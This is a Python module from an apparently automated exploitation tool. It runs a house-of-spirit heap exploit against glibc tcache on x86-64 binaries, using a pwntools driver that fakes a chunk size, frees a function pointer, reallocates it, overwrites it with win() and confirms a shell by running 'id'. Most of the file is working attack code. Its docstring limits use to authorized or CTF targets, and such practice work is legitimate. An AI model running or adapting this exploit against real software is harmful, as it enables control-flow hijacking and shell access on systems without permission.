"""House-of-spirit, verified by execution (real glibc tcache).

House-of-spirit frees an attacker-crafted FAKE chunk so it enters a free bin (the tcache on modern
glibc); the next same-sized malloc then hands that pointer back. By aiming the fake chunk's data at
a function pointer and freeing it, the following allocation returns a pointer AT that pointer, and a
write hijacks it -> shell. Unlike house-of-force this is NOT mitigated on modern glibc: the tcache
free fast-path returns before the fastbin next-size checks, so only a valid aligned size and an
aligned mem pointer are needed. Verified by execution. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (hos driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
handler = sym.get("handler") or sym.get("fnptr") or sym.get("hook")
win = sym.get("win")
if handler is None or win is None:
    print("NOT_APPLICABLE (no house-of-spirit shape: need a function pointer + win())"); sys.exit(1)
if handler % 16 != 0:
    print("NOT_APPLICABLE (target function pointer is not 16-aligned)"); sys.exit(1)

MARK = b"BINORACLE_HOS_PWNED"

def attempt(size):
    # fake chunk header at handler-0x10; its size field is at handler-8. free(handler) puts it in
    # tcache[size]; the next malloc of that bin returns handler; then a write overwrites it with win.
    io = None
    try:
        io = process([name])
        def give(x):
            try: io.recvrepeat(0.2)
            except Exception: pass
            io.send(x); time.sleep(0.08)
        give(p64(handler - 8))      # addr: where to plant the fake size
        give(p64(size | 1))         # val:  fake size (prev_inuse set)
        give(p64(handler))          # free: the fake chunk's data pointer
        give(p64(win))              # data: overwrite handler with win
        time.sleep(0.25)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.1)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

# the fake size must match the program's malloc request bin; sweep the common tcache sizes
for size in (0x40, 0x30, 0x50, 0x20, 0x60, 0x70, 0x80, 0x90, 0xa0):
    if attempt(size):
        print("VERIFIED size=%#x handler=%#x win=%#x" % (size, handler, win))
        sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autohos(binary: str) -> dict:
    """House-of-spirit verificado por ejecucion (tcache de glibc real). Necesita la forma de
    practica (un puntero de funcion 16-alineado + win()). Docker o sandbox nativo; degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_hos.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-spirit (tcache): chunk falso liberado -> malloc lo devuelve -> "
                   f"escritura -> hijack -> shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"house-of-spirit: no verificado ({eng}) (sin la forma HoS o timing)")
    return res


def render_hos(r: dict) -> str:
    out = ["## Auto house-of-spirit (tcache, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
